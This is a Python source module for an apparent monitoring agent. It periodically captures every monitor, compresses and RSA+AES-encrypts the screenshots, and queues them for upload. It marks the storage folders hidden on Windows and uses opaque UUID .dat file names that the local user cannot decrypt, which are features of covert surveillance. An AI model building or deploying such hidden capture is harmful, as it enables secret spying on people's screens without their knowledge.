"""屏幕采集器模块

使用 mss 抓取所有显示器（多屏支持），Pillow 转 JPEG 后加密落盘，并写入待上传队列。
落盘前根据 SCREENSHOT_MAX_SIZE_KB 阈值自动压缩（降质量 + 缩放），控制文件体积。
截图使用 RSA+AES 混合加密，文件名为 UUID，扩展名 .dat，Client 端无法解密。
采集目录结构：agent/data/screenshots/{YYYYMMDD}/{uuid}_m{idx}.dat
"""
import ctypes
import os
import sys
import threading
import time
import uuid
from datetime import datetime
from io import BytesIO
from typing import Any, List, Optional, Tuple

import mss
from PIL import Image

from src.config.config import config
from src.storage.db import get_db
from src.uploader.credentials import load_credentials
from src.utils.crypto import encrypt_screenshot
from src.utils.logger import get_logger

logger = get_logger(__name__)


def _set_hidden(path: str) -> None:
    """将指定路径设置为隐藏属性（仅 Windows 生效）。

    Windows 下调用 SetFileAttributesW 设置 FILE_ATTRIBUTE_HIDDEN(0x2)，
    非 Windows 平台直接跳过。
    """
    if sys.platform != 'win32':
        return
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x2)
    except Exception as e:
        logger.warning(f'设置隐藏属性失败 path={path}: {e}')


def get_monitor_resolutions() -> list[dict]:
    """获取本机所有物理显示器的分辨率。

    使用 mss.mss().monitors[1:] 获取各物理显示器（monitors[0] 是合并虚拟区域）。

    Returns:
        形如 [{"width": 1920, "height": 1080}, ...]；异常时返回空列表
    """
    try:
        with mss.mss() as sct:
            monitors = sct.monitors[1:]
            return [
                {'width': m['width'], 'height': m['height']} for m in monitors
            ]
    except Exception as e:
        logger.error(f'获取显示器分辨率失败: {e}', exc_info=True)
        return []


def _save_with_size_limit(img: Image.Image) -> Tuple[bytes, int]:
    """将图片压缩为 JPEG 字节，若超过大小阈值则逐步降低清晰度重新压缩。

    压缩策略：
    1. 先按 SCREENSHOT_MAX_WIDTH 缩放（高分屏降分辨率）
    2. 在内存中依次尝试递降 quality 档位，命中后返回
    3. 若所有 quality 档位仍超阈值，则缩小 50% 再尝试一轮
    4. 最终保证返回的 JPEG 不超过阈值（或尽可能接近）

    Args:
        img: PIL Image 对象（RGB）

    Returns:
        (jpeg_bytes, quality)：JPEG 二进制数据与最终 quality 值
    """
    max_size = config.SCREENSHOT_MAX_SIZE_KB * 1024
    quality_steps = config.SCREENSHOT_QUALITY_STEPS
    max_width = config.SCREENSHOT_MAX_WIDTH

    # 高分屏缩放：宽度超过 max_width 时等比缩小
    # 使用 BILINEAR：屏幕截图以文字/UI 为主，BILINEAR 比 LANCZOS 快数倍且视觉差异极小
    current = img
    if current.width > max_width:
        ratio = max_width / current.width
        new_size = (max_width, int(current.height * ratio))
        current = current.resize(new_size, Image.BILINEAR)
        logger.debug(
            f'缩放: {img.width}x{img.height} -> {new_size[0]}x{new_size[1]}'
        )

    # 在内存中尝试各 quality 档位，命中后返回
    chosen_buf: Optional[bytes] = None
    chosen_quality = quality_steps[-1]
    for quality in quality_steps:
        buf = BytesIO()
        current.save(buf, 'JPEG', quality=quality)
        if buf.tell() <= max_size:
            chosen_buf = buf.getvalue()
            chosen_quality = quality
            break

    # 所有 quality 档位仍超阈值：缩小 50% 再试一轮
    if chosen_buf is None and current.width > 480:
        new_size = (current.width // 2, current.height // 2)
        current = current.resize(new_size, Image.BILINEAR)
        for quality in quality_steps:
            buf = BytesIO()
            current.save(buf, 'JPEG', quality=quality)
            if buf.tell() <= max_size:
                chosen_buf = buf.getvalue()
                chosen_quality = quality
                break
        if chosen_buf is None:
            logger.warning(
                f'截图仍超阈值({config.SCREENSHOT_MAX_SIZE_KB}KB)，'
                f'最终质量={quality_steps[-1]} 尺寸={new_size}'
            )

    # 兜底：用最低质量档位生成
    if chosen_buf is None:
        buf = BytesIO()
        current.save(buf, 'JPEG', quality=quality_steps[-1])
        chosen_buf = buf.getvalue()

    return chosen_buf, chosen_quality


class ScreenCollector:
    """屏幕采集器：定时抓取所有显示器截图并写入数据库队列。

    支持多屏幕：mss.monitors[0] 是所有屏幕合并的虚拟区域，monitors[1:] 才是
    各个物理显示器。本采集器会遍历 monitors[1:]，每个屏幕单独生成一张截图。
    使用 threading.Event 作为停止信号，后台线程 daemon=True。
    """

    def __init__(self, interval: Optional[int] = None) -> None:
        """初始化屏幕采集器。

        Args:
            interval: 采集间隔（秒），默认 config.SCREENSHOT_INTERVAL
        """
        self.interval = (
            interval if interval is not None else config.SCREENSHOT_INTERVAL
        )
        # 停止信号
        self._stop_event = threading.Event()
        # 唤醒信号：用于 update_interval 时打断 wait，使新间隔立即生效
        self._wake_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        # 复用 mss 实例，避免每次采集都创建/销毁 GDI 资源
        self._sct: Optional[Any] = None
        # 缓存从 credentials.json 加载的 RSA 公钥（PEM 字符串）
        self._public_key: Optional[str] = None

    def _load_public_key(self) -> Optional[str]:
        """从 credentials.json 读取 public_key 并缓存到 self._public_key。

        若已加载则直接返回缓存值；若凭证文件不存在或不含 public_key 字段，
        返回 None 并记录警告。

        Returns:
            PEM 格式的 RSA 公钥字符串；不可用时返回 None
        """
        if self._public_key is not None:
            return self._public_key
        creds = load_credentials()
        if creds and creds.get('public_key'):
            self._public_key = creds['public_key']
            logger.debug('已从本地凭证加载截图加密公钥')
        else:
            logger.warning('本地凭证中未找到 public_key，截图加密将失败')
        return self._public_key

    def _get_sct(self) -> Any:
        """惰性创建并复用 mss 实例。"""
        if self._sct is None:
            self._sct = mss.mss()
        return self._sct

    def capture_once(self) -> List[str]:
        """抓取一次所有显示器，加密保存为 .dat，写入数据库队列。

        截图经 JPEG 压缩后使用 RSA+AES 混合加密落盘，文件名为 UUID。
        Client 端无私钥无法解密，仅服务端可还原。

        Returns:
            所有截图的绝对路径列表（按显示器索引顺序）；全部失败时返回空列表
        """
        now = datetime.now()
        date_dir = now.strftime('%Y%m%d')
        # 落盘目录：{SCREENSHOTS_DIR}/{YYYYMMDD}/
        target_dir = os.path.join(config.SCREENSHOTS_DIR, date_dir)
        # 统一的采集时间戳（ISO 8601），所有屏幕共用一条记录的 taken_at
        taken_at = now.isoformat()
        saved_paths: List[str] = []

        # 加载加密公钥（首次调用时从 credentials.json 读取并缓存）
        public_key = self._load_public_key()

        try:
            os.makedirs(target_dir, exist_ok=True)
            # 设置隐藏属性：screenshots 根目录 + 日期目录
            _set_hidden(config.SCREENSHOTS_DIR)
            _set_hidden(target_dir)

            # 复用 mss 实例，避免每次采集都创建/销毁 GDI 句柄
            sct = self._get_sct()
            # monitors[0] 是所有屏幕合并的虚拟区域，跳过；monitors[1:] 是各物理屏幕
            monitors = sct.monitors[1:]
            if not monitors:
                # 极少见情况：拿不到任何屏幕
                logger.warning('未检测到任何显示器')
                return []

            for idx, monitor in enumerate(monitors, start=1):
                # 文件名使用 UUID + 显示器索引 _m{idx}，扩展名 .dat
                file_path = os.path.join(
                    target_dir, f'{uuid.uuid4()}_m{idx}.dat'
                )
                try:
                    raw = sct.grab(monitor)
                    # mss 返回 BGRA 像素缓冲，转 RGB
                    img = Image.frombytes(
                        'RGB', raw.size, raw.bgra, 'raw', 'BGRX'
                    )
                    # 按阈值压缩得到 JPEG 字节
                    jpeg_bytes, quality = _save_with_size_limit(img)
                    # RSA+AES 混合加密
                    if not public_key:
                        raise RuntimeError('缺少加密公钥，无法加密截图')
                    encrypted = encrypt_screenshot(jpeg_bytes, public_key)
                    # 加密后 bytes 落盘
                    with open(file_path, 'wb') as f:
                        f.write(encrypted)
                    file_size_kb = os.path.getsize(file_path) / 1024
                    logger.debug(
                        f'显示器{idx} 截图已加密保存 q={quality} '
                        f'{file_size_kb:.0f}KB'
                    )
                    saved_paths.append(file_path)
                    # 立即写入数据库待上传队列（每个文件落盘后立即入库，
                    # 缩小与 UploadWorker 清理任务的竞态窗口）
                    try:
                        get_db().insert_screenshot(
                            file_path, taken_at, monitor_index=idx
                        )
                    except Exception as e:
                        # 文件已落盘但写库失败，仅记录日志
                        logger.error(
                            f'写入截图队列失败: {e}', exc_info=True
                        )
                except Exception as e:
                    # 单个屏幕失败不影响其他屏幕
                    logger.error(
                        f'显示器 {idx} 截图失败: {e}', exc_info=True
                    )
                    continue
        except Exception as e:
            logger.error(f'截图流程异常: {e}', exc_info=True)
            return saved_paths

        logger.debug(f'本次共采集 {len(saved_paths)} 张截图')
        return saved_paths

    def _loop(self) -> None:
        """后台采集循环：每隔 interval 秒采集一次。

        使用分段 wait（1 秒粒度）响应 interval 变化，
        避免 update_interval 后要等到原 interval 结束才生效。
        """
        logger.info(f'屏幕采集器已启动，间隔 {self.interval} 秒')
        while not self._stop_event.is_set():
            try:
                self.capture_once()
            except Exception as e:
                # 线程内异常必须捕获，不让线程崩溃
                logger.error(f'采集循环异常: {e}', exc_info=True)
            # 分段 wait，最多 1 秒粒度响应 interval 变化与 wake 信号
            deadline = time.monotonic() + self.interval
            while time.monotonic() < deadline:
                if self._stop_event.is_set():
                    break
                if self._wake_event.is_set():
                    self._wake_event.clear()
                    break
                # 剩余时间与 1 秒取小，避免超过 deadline
                self._stop_event.wait(min(1.0, deadline - time.monotonic()))
        logger.info('屏幕采集器已停止')

    def start(self) -> None:
        """启动后台采集线程。"""
        if self._thread and self._thread.is_alive():
            logger.warning('屏幕采集器已在运行')
            return
        self._stop_event.clear()
        self._thread = threading.Thread(
            target=self._loop, name='ScreenCollector', daemon=True
        )
        self._thread.start()

    def stop(self) -> None:
        """停止采集线程并释放 mss 资源。"""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        # 释放 mss 实例（关闭 GDI 句柄）
        if self._sct is not None:
            try:
                self._sct.close()
            except Exception:
                pass
            self._sct = None

    def update_interval(self, new_interval: int) -> None:
        """动态更新采集间隔，立即生效。

        通过 _wake_event 打断当前 wait，使新间隔在下一轮采集立即生效。

        Args:
            new_interval: 新的采集间隔（秒）
        """
        if new_interval == self.interval:
            return
        old = self.interval
        self.interval = new_interval
        # 唤醒正在 wait 的采集线程，使其立即用新间隔开始下一轮
        self._wake_event.set()
        logger.info(f'采集间隔已更新: {old}s -> {new_interval}s')
